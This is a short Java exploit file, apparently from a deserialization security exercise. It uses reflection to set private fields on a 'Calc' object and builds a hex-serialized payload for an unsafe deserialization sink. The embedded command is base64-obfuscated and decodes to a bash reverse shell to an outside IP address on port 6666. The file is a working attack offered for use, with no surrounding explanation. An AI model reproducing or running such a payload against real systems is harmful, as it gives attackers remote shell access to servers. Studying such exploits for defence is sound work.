package com.yxxx.javasec.deserialize;


import java.lang.reflect.Field;

public class Exp1 {
    public static void main(String[] args) throws Exception {
        Calc c = new Calc();
        Class clazz= c.getClass();
        Field field = clazz.getDeclaredField("canPopCalc");
        field.setAccessible(true);
        field.set(c,true);

        Field field2 = clazz.getDeclaredField("cmd");
        field2.setAccessible(true);
        field2.set(c,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuMjA0LjExMi4xMjEvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}");

        System.out.println(Utils.objectToHexString(c));
    }
}
